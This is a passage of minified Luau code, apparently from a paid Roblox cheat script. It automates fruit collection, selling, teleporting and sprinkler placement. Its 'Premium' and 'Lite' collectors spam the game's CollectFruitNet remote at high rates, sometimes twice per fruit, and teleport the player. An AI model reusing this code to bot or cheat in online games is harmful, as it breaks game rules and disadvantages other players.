				return J > T
			end
			local d = g.RarityRank[tostring(G and G.r or "")] or 0
			local u = g.RarityRank[tostring(y and y.r or "")] or 0
			if d ~= u then
				return d > u
			end
			return tostring(G and G.name or "") < tostring(y and y.name or "")
		end)
		return G
	end,
	GetReadyFruitBucket = function()
		local G = nil
		local V = Z.TotalControl
		local y = V and (type(V.ResolveHighModeEnabledTotalControl) == "function" and V.ResolveHighModeEnabledTotalControl()) or nil
		local j = y == nil and h.high_mode or y == true
		if g.GetCheckIfPro() then
			if j and (Z.FruitFiltersDataSync and type(Z.FruitFiltersDataSync.GetFruits) == "function") then
				local V, y = pcall(Z.FruitFiltersDataSync.GetFruits, h.collect_fruit_list)
				if V and type(y) == "table" then
					G = y
				else
					warn(tostring(y))
				end
			end
		end
		if type(G) ~= "table" then
			G = Z.FruitFilters.GetReadyFruits(nil, true) or {}
		end
		return Z.FruitCollect.SortReadyFruitBucketByLivePriceFruitCollect(G)
	end,
	CollectLoopSimple = function()
		local G = Z.TotalControl
		local V = G and (type(G.ResolveFruitCollectorEnabledTotalControl) == "function" and G.ResolveFruitCollectorEnabledTotalControl()) or nil
		if V ~= true and not h.auto_collect_fruit_enabled then
			return
		end
		if Z.FruitCollect.IsMaxFruitInventory() then
			return
		end
		if Z.FruitCollect.FruitBucketIndex > # Z.FruitCollect.FruitBucket then
			Z.FruitCollect.FruitBucket = Z.FruitCollect.GetReadyFruitBucket()
			Z.FruitCollect.FruitBucketIndex = 1
		end
		local j = 0
		local i = G and (type(G.ResolveFruitCollectFastModeTotalControl) == "function" and G.ResolveFruitCollectFastModeTotalControl()) or nil
		local c = G and (type(G.ResolveHighModeEnabledTotalControl) == "function" and G.ResolveHighModeEnabledTotalControl()) or nil
		local J = c == nil and h.high_mode or c == true
		local T = i == nil and (J and g.GetCheckIfPro()) or i == true
		if # Z.FruitCollect.FruitBucket > 0 then
			local V = G and (type(G.ResolveFruitCollectTeleportTotalControl) == "function" and G.ResolveFruitCollectTeleportTotalControl()) or nil
			local y = V == nil and h.collection_teleport or V == true
			if Z.FruitCollect.IsFarFromGarden() and y then
				if not Z.GameTeleport.Garden(g.TeleportLockNames.FruitCollector) then
					Z.PetFarmReturn.SetStatus("Garden teleport failed", "#FF5555")
				end
			end
		end
		if not y.CollectFruitNet or type(y.CollectFruitNet.Fire) ~= "function" then
			return false
		end
		local d = # Z.FruitCollect.FruitBucket
		local u = Z.PlayerData.GetMaxFruitCapacity() + 300
		for G = 1, d, 1 do
			local y = Z.FruitCollect.FruitBucket[Z.FruitCollect.FruitBucketIndex]
			if not y then
				Z.FruitCollect.ResetBucket()
				break
			end
			if j > u then
				break
			end
			Z.FruitCollect.FruitBucketIndex += 1
			if V ~= true and not h.auto_collect_fruit_enabled then
				return
			end
			if Z.FruitCollect.IsMaxFruitInventory() then
				return
			end
			if not Z.FruitFilters.PassesCollectorFilters(y) then
				continue
			end
			local i = y.plantId
			local c = y.fruitId
			if T then
				Z.FruitCollect.CollectFruit(i, c)
				Z.FruitCollect.CollectFruit(i, c)
				j += 1
			else
				if Z.FruitCollect.CollectFruit(i, c) then
					j += 1
					task.wait()
				end
			end
		end
		return j
	end
}
Z.PremiumFruitCollectionV2 = {
	UseSortingPremiumFruitCollectionV2 = false;
	StartedPremiumFruitCollectionV2 = false;
	CollectBusyPremiumFruitCollectionV2 = false,
	SellRequestedPremiumFruitCollectionV2 = false;
	SellWorkerBusyPremiumFruitCollectionV2 = false;
	NextCollectAtPremiumFruitCollectionV2 = 0;
	CollectIntervalPremiumFruitCollectionV2 = .066666666666667;
	IsPremiumFastModeEnabledPremiumFruitCollectionV2 = function()
		if g.GetCheckIfPro() ~= true then
			return false
		end
		if Z.LiteFruitCollection and Z.LiteFruitCollection.IsEnabledLiteFruitCollection() then
			return false
		end
		local G = Z.TotalControl
		local V = h.auto_collect_fruit_enabled == true
		local y = h.fruit_collect_nolimits == true
		local j = h.high_mode == true
		if G and type(G.ResolveFruitCollectorEnabledTotalControl) == "function" then
			local y = G.ResolveFruitCollectorEnabledTotalControl()
			if y ~= nil then
				V = y == true
			end
		end
		if G and type(G.ResolveFruitCollectNoLimitsTotalControl) == "function" then
			local V = G.ResolveFruitCollectNoLimitsTotalControl()
			if V ~= nil then
				y = V == true
			end
		end
		if G and type(G.ResolveHighModeEnabledTotalControl) == "function" then
			local V = G.ResolveHighModeEnabledTotalControl()
			if V ~= nil then
				j = V == true
			end
		end
		return V and (y and j)
	end,
	IsSellingEnabledPremiumFruitCollectionV2 = function()
		if Z.TotalControl and (type(Z.TotalControl.IsEnabledTotalControl) == "function" and Z.TotalControl.IsEnabledTotalControl()) then
			return true
		end
		if h.auto_sell_sellallinventory == true then
			return true
		end
		if h.sell_multiplier_enabled == true and type(h.sell_multiplier_overrides) == "table" then
			for G, V in pairs(h.sell_multiplier_overrides) do
				if type(V) == "table" and V.enabled ~= false then
					return true
				end
			end
		end
		return false
	end;
	CollectReadyFruitsPremiumFruitCollectionV2 = function()
		local G = Z.FruitFiltersDataSync
		if type(G) ~= "table" or type(G.Plants) ~= "table" or type(G.BuildFruitResult) ~= "function" then
			return 0, false
		end
		if not G.Started and type(G.StartSync) == "function" then
			G.StartSync()
		end
		if not y.CollectFruitNet or type(y.CollectFruitNet.Fire) ~= "function" then
			return 0, false
		end
		local V = Z.PremiumFruitCollectionV2
		local j = V.IsSellingEnabledPremiumFruitCollectionV2()
		local i = math.huge
		if not j then
			i = math.max(Z.PlayerData.GetMaxFruitCapacity() - Z.PlayerData.GetFruitCount(), 0)
			if i <= 0 then
				return 0, false
			end
		end
		local c = {}
		local J = h.collect_fruit_list
		local T = not Z.FruitFilters.IsSelectionEmpty(J)
		local d = not j and V.UseSortingPremiumFruitCollectionV2 ~= true
		local u = false
		for V, y in pairs(G.Plants) do
			if u then
				break
			end
			if type(y) ~= "table" or y.Removed then
				continue
			end
			local j = tostring(y.PlantName or "")
			if j == "" then
				continue
			end
			if T and not Z.FruitFilters.IsSelected(J, j) then
				continue
			end
			if G.IsSingleHarvestPlant(j) then
				local V = G.BuildFruitResult(y, nil, true)
				if V and (V.has_weight and Z.FruitFilters.PassesCollectorFilters(V)) then
					c[# c + 1] = V
					u = d and # c >= i
				end
			else
				for V, j in pairs(y.Fruits or {}) do
					if type(j) == "table" and not j.Removed then
						local V = G.BuildFruitResult(y, j, false)
						if V and (V.has_weight and Z.FruitFilters.PassesCollectorFilters(V)) then
							c[# c + 1] = V
							if d and # c >= i then
								u = true
								break
							end
						end
					end
				end
			end
		end
		if # c == 0 then
			return 0, j
		end
		if V.UseSortingPremiumFruitCollectionV2 == true then
			Z.FruitCollect.SortReadyFruitBucketByLivePriceFruitCollect(c)
		end
		local q = # c
		if not j then
			q = math.min(q, i)
		end
		local E = Z.TotalControl
		local a = h.collection_teleport == true
		if E and type(E.ResolveFruitCollectTeleportTotalControl) == "function" then
			local G = E.ResolveFruitCollectTeleportTotalControl()
			if G ~= nil then
				a = G == true
			end
		end
		if q > 0 and (a and Z.FruitCollect.IsFarFromGarden()) then
			if not Z.GameTeleport.Garden(g.TeleportLockNames.FruitCollector) then
				Z.PetFarmReturn.SetStatus("Garden teleport failed", "#FF5555")
			end
		end
		for G = 1, q, 1 do
			local V = c[G]
			local y = tostring(V.plantId or "")
			local j = tostring(V.fruitId or "")
			Z.FruitCollect.CollectFruit(y, j)
		end
		return q, j
	end;
	RequestSellPremiumFruitCollectionV2 = function()
		local G = Z.PremiumFruitCollectionV2
		G.SellRequestedPremiumFruitCollectionV2 = true
		if G.SellWorkerBusyPremiumFruitCollectionV2 then
			return true
		end
		G.SellWorkerBusyPremiumFruitCollectionV2 = true
		task.spawn(function()
			while G.SellRequestedPremiumFruitCollectionV2 do
				G.SellRequestedPremiumFruitCollectionV2 = false
				local V, y = pcall(Z.SellManager.SellAll)
				if not V then
					warn("[PremiumFruitCollectionV2] Seller error:", y)
				end
			end
			G.SellWorkerBusyPremiumFruitCollectionV2 = false
		end)
		return true
	end;
	StartPremiumFruitCollectionV2 = function()
		local G = Z.PremiumFruitCollectionV2
		if G.StartedPremiumFruitCollectionV2 then
			return false
		end
		G.StartedPremiumFruitCollectionV2 = true
		y.RunService.Heartbeat:Connect(function()
			local V = y.Workspace:GetServerTimeNow()
			local j = math.max(tonumber(G.CollectIntervalPremiumFruitCollectionV2) or (.066666666666667), .001)
			if G.NextCollectAtPremiumFruitCollectionV2 <= 0 then
				G.NextCollectAtPremiumFruitCollectionV2 = V
			end
			if V < G.NextCollectAtPremiumFruitCollectionV2 then
				return
			end
			local i = math.floor(((V - G.NextCollectAtPremiumFruitCollectionV2)) / j) + 1
			G.NextCollectAtPremiumFruitCollectionV2 += i * j
			if Z.SystemPause.IsPausedSystemPause("Fruit Collector") or not G.IsPremiumFastModeEnabledPremiumFruitCollectionV2() then
				return
			end
			if G.CollectBusyPremiumFruitCollectionV2 then
				return
			end
			G.CollectBusyPremiumFruitCollectionV2 = true
			local c, J, T = pcall(G.CollectReadyFruitsPremiumFruitCollectionV2)
			G.CollectBusyPremiumFruitCollectionV2 = false
			if not c then
				warn("[PremiumFruitCollectionV2] Collector error:", J)
				return
			end
			if ((tonumber(J) or 0)) > 0 and T == true then
				G.RequestSellPremiumFruitCollectionV2()
			end
		end)
		return true
	end
}
Z.PremiumFruitCollectionV2.StartPremiumFruitCollectionV2()
Z.LiteFruitCollection = {
	SettingsLiteFruitCollection = {
		SpeedPercent = 40
	},
	has_changed_settings = false;
	IsEnabledLiteFruitCollection = function()
		if l.lite_fruit_collection ~= nil then
			return l.lite_fruit_collection == true
		end
		return h.lite_fruit_collection == true
	end,
	GetSpeedPercentLiteFruitCollection = function()
		local G
		if l.lite_fruit_collection_speed ~= nil then
			G = tonumber(l.lite_fruit_collection_speed)
		else
			G = tonumber(h.lite_fruit_collection_speed)
		end
		if G == nil then
			G = Z.LiteFruitCollection.SettingsLiteFruitCollection.SpeedPercent
		end
		return math.clamp(G, 0, 100)
	end,
	IsCollectorActiveLiteFruitCollection = function()
		local G = Z.TotalControl
		local V = nil
		if G and type(G.ResolveFruitCollectorEnabledTotalControl) == "function" then
			V = G.ResolveFruitCollectorEnabledTotalControl()
		end
		if V == true then
			return true
		end
		return h.auto_collect_fruit_enabled == true
	end,
	OnChangedValuesLiteMode = function()
		Z.LiteFruitCollection.has_changed_settings = true
	end,
	RunCycleLiteFruitCollection_old = function(G, V)
		if V ~= true and not Z.LiteFruitCollection.IsEnabledLiteFruitCollection() then
			return 0
		end
		if not Z.LiteFruitCollection.IsCollectorActiveLiteFruitCollection() then
			return 0
		end
		local y = Z.FruitFiltersDataSync
		if type(y) ~= "table" or type(y.GetFruitsReady) ~= "function" then
			return 0
		end
		local j = y.GetFruitsReady(true)
		if # j == 0 then
			return 0
		end
		local i = Z.LiteFruitCollection.GetSpeedPercentLiteFruitCollection() / 100
		local c = G and G.batch_min or 9
		local J = G and G.batch_max or 250
		local T = 900
		local d = 3400
		local u = 1
		local q = 0
		local E = math.floor(c + (((J - c)) * i))
		local a = math.floor(T + (((d - T)) * i))
		local H = .001
		local r = .8
		local Y = r - (((r - H)) * i)
		local e = Z.TotalControl
		local s = e and (type(e.ResolveFruitCollectTeleportTotalControl) == "function" and e.ResolveFruitCollectTeleportTotalControl()) or nil
		local N = s == nil and h.collection_teleport or s == true
		if Z.FruitCollect.IsFarFromGarden() and N then
			if not Z.GameTeleport.Garden(g.TeleportLockNames.FruitCollector) then
				Z.PetFarmReturn.SetStatus("Garden teleport failed", "#FF5555")
			end
		end
		while u <= # j and q < a do
			local G = 0
			task.wait(Y)
			if Z.LiteFruitCollection.has_changed_settings then
				Z.LiteFruitCollection.has_changed_settings = false
				break
			end
			for V = 1, E, 1 do
				if u > # j or q >= a then
					break
				end
				if Z.LiteFruitCollection.has_changed_settings then
					break
				end
				if Z.FruitCollect.IsMaxFruitInventory() then
					break
				end
				local y = j[u]
				u += 1
				if type(y) ~= "table" then
					continue
				end
				local i = tostring(y.plantId or "")
				local c = tostring(y.fruitId or "")
				if i == "" then
					continue
				end
				Z.FruitCollect.CollectFruit(i, c)
				Z.FruitCollect.CollectFruit(i, c)
				G += 1
				q += 1
			end
			if G > 1 or Z.FruitCollect.IsMaxFruitInventory() then
				task.spawn(function()
					Z.SellManager.SellAll()
				end)
			end
			if G == 0 then
				break
			end
		end
		return q
	end,
	RunCycleLiteFruitCollection = function(G, V)
		if V ~= true and not Z.LiteFruitCollection.IsEnabledLiteFruitCollection() then
			return 0
		end
		if not Z.LiteFruitCollection.IsCollectorActiveLiteFruitCollection() then
			return 0
		end
		local y = Z.FruitFiltersDataSync
		if type(y) ~= "table" or type(y.GetFruitsReady) ~= "function" then
			return 0
		end
		local j = y.GetFruitsReady(true)
		if # j == 0 then
			return 0
		end
		local i = Z.LiteFruitCollection.GetSpeedPercentLiteFruitCollection() / 100
		local c = G and G.batch_min or 50
		local J = G and G.batch_max or 350
		local T = 1600
		local d = 4400
		local u = 1
		local q = 0
		local E = math.floor(c + (((J - c)) * i))
		local a = math.floor(T + (((d - T)) * i))
		local H = .001
		local r = .3
		local Y = r - (((r - H)) * i)
		local e = Z.TotalControl
		local s = e and (type(e.ResolveFruitCollectTeleportTotalControl) == "function" and e.ResolveFruitCollectTeleportTotalControl()) or nil
		local N = s == nil and h.collection_teleport or s == true
		if Z.FruitCollect.IsFarFromGarden() and N then
			if not Z.GameTeleport.Garden(g.TeleportLockNames.FruitCollector) then
				Z.PetFarmReturn.SetStatus("Garden teleport failed", "#FF5555")
			end
		end
		while true do
			task.wait(Y)
			if Z.LiteFruitCollection.has_changed_settings then
				Z.LiteFruitCollection.has_changed_settings = false
				break
			end
			if Z.FruitCollect.IsMaxFruitInventory() then
				break
			end
			if u > # j then
				break
			end
			for G = 1, E, 1 do
				if Z.LiteFruitCollection.has_changed_settings then
					break
				end
				if Z.FruitCollect.IsMaxFruitInventory() then
					break
				end
				if u > # j then
					break
				end
				local V = j[u]
				u = u + 1
				if not V then
					continue
				end
				if type(V) ~= "table" then
					continue
				end
				local y = tostring(V.plantId or "")
				local i = tostring(V.fruitId or "")
				if y == "" then
					continue
				end
				Z.FruitCollect.CollectFruit(y, i)
				q = q + 1
			end
		end
		if q > 1 or Z.FruitCollect.IsMaxFruitInventory() then
			task.spawn(function()
				Z.SellManager.SellAll()
			end)
		end
		return q
	end
}
g.PetFarmStatusText = ""
Z.PetFarmReturn = {
	MaxDistance = 35;
	NextCheckAt = 0;
	SetStatus = function(G, V)
		g.PetFarmStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\144\190 [Pet Farm]</font> <font color=\'%s\'>%s</font></stroke>", V or "#FFFFFF", tostring(G or ""))
	end,
	GetTimer = function()
		local G = Z.TotalControl
		local V = G and (type(G.ResolvePetFarmReturnTimerTotalControl) == "function" and G.ResolvePetFarmReturnTimerTotalControl()) or nil
		local y = V == nil and h.pet_return_farm_timer or V
		return math.max(math.floor(tonumber(y) or 60), 3)
	end;
	ResetTimer = function()
		Z.PetFarmReturn.NextCheckAt = os.clock() + Z.PetFarmReturn.GetTimer()
	end;
	Loop = function()
		local G = Z.TotalControl
		local V = G and (type(G.ResolvePetFarmReturnEnabledTotalControl) == "function" and G.ResolvePetFarmReturnEnabledTotalControl()) or nil
		local y = V == nil and h.pet_return_farm or V == true
		if not y then
			g.PetFarmStatusText = ""
			Z.PetFarmReturn.NextCheckAt = 0
			return
		end
		if Z.PlayerData.GetIsInOwnGarden() then
			Z.PetFarmReturn.NextCheckAt = 0
			Z.PetFarmReturn.SetStatus("At farm", "#7CFC00")
			return
		end
		if Z.PetFarmReturn.NextCheckAt <= 0 then
			Z.PetFarmReturn.ResetTimer()
		end
		local j = math.max(math.ceil(Z.PetFarmReturn.NextCheckAt - os.clock()), 0)
		if j > 0 then
			Z.PetFarmReturn.SetStatus(string.format("Teleporting in %ds", j), "#FFD966")
			return
		end
		if Z.Teleport.IsLocked(g.TeleportLockNames.PetFarmReturn) then
			return
		end
		Z.PetFarmReturn.SetStatus("Teleporting to farm...", "#66CCFF")
		if not Z.GameTeleport.Garden(g.TeleportLockNames.PetFarmReturn) then
			Z.PetFarmReturn.SetStatus("Garden teleport failed", "#FF5555")
		else
			task.wait(1.5)
			if not Z.Farm.TeleportToCenter(g.TeleportLockNames.PetFarmReturn) then
				Z.PetFarmReturn.SetStatus("Farm centre not found", "#FF5555")
			end
		end
		Z.PetFarmReturn.NextCheckAt = 0
	end
}
Z.PetFarmReturn.NextCheckAt = 0
task.spawn(function()
	while true do
		task.wait(.3)
		if Z.SystemPause.IsPausedSystemPause("Turbo Sell") then
			continue
		end
		if not Z.SellManager.IsTurboEnabledSellManager() then
			task.wait(3)
			continue
		end
		Z.SellManager.SellAll()
	end
end)
task.spawn(function()
	while true do
		task.wait(2)
		if Z.SystemPause.IsPausedSystemPause("Sell Multiplier") then
			continue
		end
		if not ((Z.TotalControl and (Z.TotalControl.IsEnabledTotalControl and Z.TotalControl.IsEnabledTotalControl()))) and (h.sell_multiplier_enabled == true and h.auto_collect_fruit_enabled ~= true) then
			Z.SellManager.SellAll()
		end
	end
end)
task.spawn(function()
	while true do
		task.wait()
		if Z.SystemPause.IsPausedSystemPause("Fruit Collector") then
			task.wait(1)
			continue
		end
		if Z.LiteFruitCollection and Z.LiteFruitCollection.IsEnabledLiteFruitCollection() then
			task.wait(.1)
			if not Z.LiteFruitCollection.IsCollectorActiveLiteFruitCollection() then
				task.wait(1)
				continue
			end
			local G, V = pcall(function()
				Z.LiteFruitCollection.RunCycleLiteFruitCollection()
			end)
			if not G then
				warn("[LiteFruitCollection] Loop error:", V)
				task.wait(1)
			end
			continue
		end
		local G = Z.TotalControl
		local V = G and (type(G.ResolveFruitCollectorEnabledTotalControl) == "function" and G.ResolveFruitCollectorEnabledTotalControl()) or nil
		if Z.PremiumFruitCollectionV2.IsPremiumFastModeEnabledPremiumFruitCollectionV2() then
			task.wait(1)
			continue
		end
		local y = G and (type(G.ResolveFruitCollectNoLimitsTotalControl) == "function" and G.ResolveFruitCollectNoLimitsTotalControl()) or nil
		local j = y == nil and h.fruit_collect_nolimits or y == true
		if j and g.GetCheckIfPro() == true then
			task.wait(.067)
		else
			task.wait(.1)
		end
		if V ~= true and not h.auto_collect_fruit_enabled then
			task.wait(1)
			continue
		end
		local i = {
			batch_max = 600;
			batch_min = 200
		}
		Z.LiteFruitCollection.RunCycleLiteFruitCollection(i, true)
		task.spawn(function()
			Z.SellManager.SellAll()
		end)
	end
end)
g.SprinklerPlaceStatusText = ""
Z.SprinklerPlacer = {
	MaxPerLoop = 10,
	MinSpacing = 1,
	EquippedBySystem = false;
	SetStatus = function(G, V)
		g.SprinklerPlaceStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\146\166 [Sprinkler]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), tostring(G or "Waiting"))
	end;
	ClearStatus = function()
		g.SprinklerPlaceStatusText = ""
	end,
	GetDelay = function()
		return math.max(tonumber(h.sprinkler_place_delay) or .6, .2)
	end,
	GetNames = function()
		local G = {}
		local V = {}
		for y, Z in ipairs(g.AllGearShopTable) do
			local j = type(Z) == "table" and Z.name or nil
			if type(j) ~= "string" or j == "" or not string.find(j, "Sprinkler", 1, true) or V[j] then
				continue
			end
			V[j] = true
			table.insert(G, j)
		end
		table.sort(G)
		return G
	end;
	IsValidName = function(G)
		if type(G) ~= "string" or G == "" then
			return false
		end
		for V, y in ipairs(Z.SprinklerPlacer.GetNames()) do
			if y == G then
				return true
			end
		end
		return false
	end;
	GetDropdown = function()
		local G = {}
		for V, y in ipairs(Z.SprinklerPlacer.GetNames()) do
			local j = Z.GearData.GetGeatItemDetails(y) or {}
			local i = tostring(j.rarity or "Unknown")
			local c = Z.Data.GetRarityColor(i)
			table.insert(G, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"%s\">%s</font>", y, c, i),
				Value = y
			})
		end
		return G
	end;
	GetAllSelection = function()
		local G = {}
		for V, y in ipairs(Z.SprinklerPlacer.GetNames()) do
			G[y] = true
		end
		return G
	end;
	GetOverrideTarget = function(G)
		local V = h.sprinkler_place_overrides
		if type(V) ~= "table" then
			return nil
		end
		local y = tonumber(V[G])
		if not y then
			return nil
		end
		return math.max(math.floor(y), 0)
	end;
	SetOverrideTarget = function(G, V)
		if not Z.SprinklerPlacer.IsValidName(G) then
			return false
		end
		V = math.floor(tonumber(V) or 0)
		if V <= 0 then
			return false
		end
		if type(h.sprinkler_place_overrides) ~= "table" then
			h.sprinkler_place_overrides = {}
		end
		h.sprinkler_place_overrides[G] = V
		return true
	end;
	RemoveOverrideTarget = function(G)
		if type(h.sprinkler_place_overrides) ~= "table" then
			h.sprinkler_place_overrides = {}
			return false
		end
		if h.sprinkler_place_overrides[G] == nil then
			return false
		end
		h.sprinkler_place_overrides[G] = nil
		return true
	end;
	GetTargetAmount = function(G)
		local V = Z.TotalControl.ResolveSprinklerTargetAmountTotalControl()
		if V ~= nil then
			return math.max(math.floor(tonumber(V) or 0), 0)
		end
		local y = Z.SprinklerPlacer.GetOverrideTarget(G)
		if y ~= nil then
			return y
		end
		return math.max(math.floor(tonumber(h.sprinkler_place_default_target) or 1), 0)
	end,
	GetSprinklersFolder = function()
		local G = Z.Farm.GetOwnPlot()
		if not G then
			return nil
		end
		return G:FindFirstChild("Sprinklers")
	end,
	GetPlacedCounts = function()
		local G = {}
		local V = 0
		local y = Z.SprinklerPlacer.GetSprinklersFolder()
		if not y then
			return G, V
		end
		for y, Z in ipairs(y:GetChildren()) do
			local j = Z:GetAttribute("SprinklerName")
			if type(j) ~= "string" or j == "" then
				continue
			end
			G[j] = ((G[j] or 0)) + 1
			V += 1
		end
		return G, V
	end;
	GetLifetimeSprinklerPlacer = function(G)
		G = tostring(G or "")
		local V = type(y.SprinklerData) == "table" and ((type(y.SprinklerData.Data) == "table" and y.SprinklerData.Data or y.SprinklerData)) or nil
		if G == "" or type(V) ~= "table" then
			return nil
		end
		for V, y in ipairs(V) do
			if type(y) == "table" and y.SprinklerName == G then
				local G = tonumber(y.Lifetime)
				return G and (G > 0 and G) or nil
			end
		end
		return nil
	end;
	GetActivePlacedCountsSprinklerPlacer = function()
		local G = y.GardenSyncController
		if type(G) ~= "table" or type(G.GetSprinklers) ~= "function" then
			return nil
		end
		local V, j = pcall(function()
			return G:GetSprinklers(g.player_userid)
		end)
		if not V or type(j) ~= "table" then
			return nil
		end
		local i = {}
		local c = 0
		local J = os.time()
		for G, V in pairs(j) do
			if type(V) ~= "table" then
				continue
			end
			local y = V.SprinklerName
			if type(y) ~= "string" or y == "" then
				continue
			end
			c += 1
			local j = Z.SprinklerPlacer.GetLifetimeSprinklerPlacer(y)
			local T = tonumber(V.PlacedAt)
			local d = T and (j and (T + j) - J) or nil
			if not d or d >= 5 then
				i[y] = ((i[y] or 0)) + 1
			end
		end
		return i, c
	end;
	GetOccupiedPositions = function()
		local G = {}
		local V = Z.SprinklerPlacer.GetSprinklersFolder()
		if not V then
			return G
		end
		for V, y in ipairs(V:GetChildren()) do
			local Z
			if y:IsA("Model") then
				Z = (y:GetPivot()).Position
			elseif y:IsA("BasePart") then
				Z = y.Position
			end
			if typeof(Z) == "Vector3" then
				table.insert(G, Z)
			end
		end
		return G
	end,
	IsPositionOpen = function(G, V)
		if typeof(G) ~= "Vector3" then
			return false
		end
		for V, y in ipairs(V or {}) do
			if typeof(y) ~= "Vector3" then
				continue
			end
			local j = Vector3.new(G.X - y.X, 0, G.Z - y.Z)
			if j.Magnitude < Z.SprinklerPlacer.MinSpacing then
				return false
			end
		end
		return true
	end;
	GetTool = function(G)
		if type(G) ~= "string" or G == "" then
			return nil
		end
		for V, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if not y:IsA("Tool") then
				continue
			end
			local j = y:GetAttribute("Sprinkler")
			if j == G or y.Name == G and j ~= nil then
				local V = Z.SprinklerPlacer.GetToolCountSprinklerPlacer(y)
				if not Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Gear", G, V) then
					return y
				end
			end
		end
		return nil
	end,
	GetToolCountSprinklerPlacer = function(G)
		if typeof(G) ~= "Instance" or not G.Parent or not G:IsA("Tool") then
			return 0
		end
		return math.max(math.floor(tonumber(G:GetAttribute("Count")) or 1), 0)
	end;
	EquipTool = function(G)
		if not G or not G:IsA("Tool") then
			return false
		end
		if Z.Player.IsToolHeld(G) then
			return true
		end
		Z.Player.UnequipTools()
		if not Z.Player.EquipTool(G) then
			return false
		end
		Z.SprinklerPlacer.EquippedBySystem = true
		task.wait(.15)
		return Z.Player.IsToolHeld(G)
	end;
	CleanupTool = function()
		if not Z.SprinklerPlacer.EquippedBySystem then
			return
		end
		Z.SprinklerPlacer.EquippedBySystem = false
		Z.Player.UnequipTools()
	end,
	SaveCurrentPosition = function()
		local G = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		if not G then
			return false, "Character not found"
		end
		local V, j = Z.Farm.GetPlantAreaAtPosition(G.Position)
		if not V or typeof(j) ~= "Vector3" then
			return false, "Stand inside your farm"
		end
		h.sprinkler_place_saved_position = {
			area = V.Name;
			x = j.X;
			z = j.Z
		}
		a.Save.SaveDataSync()
		return true, "Sprinkler position saved"
	end;
	GetSavedPositionText = function()
		local G = h.sprinkler_place_saved_position
		local V = type(G) == "table" and tostring(G.area or "") or ""
		local y = type(G) == "table" and tonumber(G.x) or nil
		local Z = type(G) == "table" and tonumber(G.z) or nil
		if V == "" or not y or not Z then
			return "\240\159\147\141 Saved Position: Not set"
		end
		return string.format("\240\159\147\141 Saved Position: %s | X %.2f | Z %.2f", V, y, Z)
	end,
	GetDataLocalPositionSprinklerPlacer = function(G)
		local V = type(G) == "table" and G.Positions or nil
		if type(V) ~= "table" then
			return nil
		end
		local y = tonumber(V.PosX)
		local Z = tonumber(V.PosY)
		local j = tonumber(V.PosZ)
		if not y or not Z or not j then
			return nil
		end
		return Vector3.new(y, Z, j)
	end;
	GetDataWorldPositionSprinklerPlacer = function(G)
		local V = Z.SprinklerPlacer.GetDataLocalPositionSprinklerPlacer(G)
		local y = Z.Farm.GetSpawnPoint()
		if typeof(V) ~= "Vector3" or typeof(y) ~= "Instance" or not y:IsA("BasePart") then
			return nil
		end
		return y.CFrame:PointToWorldSpace(V)
	end,
	GetPhysicalPlantPositionSprinklerPlacer = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil, nil
		end
		local V = Z.Farm.GetMyPlantsFolder()
		if not V then
			return nil, nil
		end
		local y = Z.FruitFiltersDataSync
		local j = y and (type(y.GetPlantIdFruitFiltersDataSync) == "function" and y.GetPlantIdFruitFiltersDataSync) or nil
		if not j then
			return nil, nil
		end
		for V, y in ipairs(V:GetChildren()) do
			if typeof(y) ~= "Instance" or not y.Parent or j(nil, nil, y) ~= G then
				continue
			end
			if y:GetAttribute("emove") == true then
				return nil, y
			end
			local Z, i = pcall(function()
				return y:GetPivot()
			end)
			if Z and typeof(i) == "CFrame" then
				return i.Position, y
			end
		end
		return nil, nil
	end;
	AddTargetPlantCandidateSprinklerPlacer = function(G, V, y, Z)
		if type(y) ~= "table" or typeof(y.position) ~= "Vector3" then
			return G, V
		end
		local j = Z and ((y.position - Z)).Magnitude or 0
		if j < V then
			return y, j
		end
		return G, V
	end,
	GetTargetPlant = function()
		local G = tostring(h.sprinkler_place_target_plant or "")
		local V = Z.FruitFiltersDataSync
		if G == "" or not V then
			return nil
		end
		if not V.Started and type(V.StartSync) == "function" then
			V.StartSync()
		end
		local y = Z.Farm.GetPermanentCenterPosition()
		local j
		local i = math.huge
		local c = {}
		if type(V.Plants) == "table" and type(V.GetPlantIdFruitFiltersDataSync) == "function" then
			for J, T in pairs(V.Plants) do
				if type(T) ~= "table" or T.Removed or tostring(T.PlantName or "") ~= G then
					continue
				end
				local d = V.GetPlantIdFruitFiltersDataSync(J, T, nil)
				if d == "" then
					continue
				end
				c[d] = true
				local u, q = Z.SprinklerPlacer.GetPhysicalPlantPositionSprinklerPlacer(d)
				local g = u or Z.SprinklerPlacer.GetDataWorldPositionSprinklerPlacer(T)
				j, i = Z.SprinklerPlacer.AddTargetPlantCandidateSprinklerPlacer(j, i, {
					id = d,
					name = G,
					data = T,
					physical = q,
					position = g
				}, y)
			end
		end
		local J = Z.Farm.GetMyPlantsFolder()
		if J and type(V.GetPlantIdFruitFiltersDataSync) == "function" then
			for J, T in ipairs(J:GetChildren()) do
				if not T:IsA("Model") or T:GetAttribute("emove") == true then
					continue
				end
				local d = V.GetPlantIdFruitFiltersDataSync(nil, nil, T)
				if d == "" or c[d] or tostring(T:GetAttribute("SeedName") or T:GetAttribute("PlantName") or "") ~= G then
					continue
				end
				local u, q = pcall(function()
					return T:GetPivot()
				end)
				if u and typeof(q) == "CFrame" then
					j, i = Z.SprinklerPlacer.AddTargetPlantCandidateSprinklerPlacer(j, i, {
						id = d,
						name = G;
						physical = T;
						position = q.Position
					}, y)
				end
			end
		end
		return j
	end,
	GetBasePosition = function(G)
		local V = Z.TotalControl.ResolveSprinklerPlaceModeTotalControl()
		local y = tostring(V or h.sprinkler_place_mode or W.UseDefault)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		if Z.Farm.IsPlacementModeFarm(y) then
			local G, V, j = Z.Farm.GetPlacementPositionFarm(y)
			if j ~= W.Default then
				if typeof(G) ~= "Vector3" or not V then
					return nil, tostring(j or "Farm position") .. " not found"
				end
				return G, nil, V.Name
			end
			local i = Z.Farm.GetPermanentCenterPosition()
			if typeof(i) ~= "Vector3" then
				return nil, "Farm centre not found"
			end
			return i
		end
		if y == "Plant Target" then
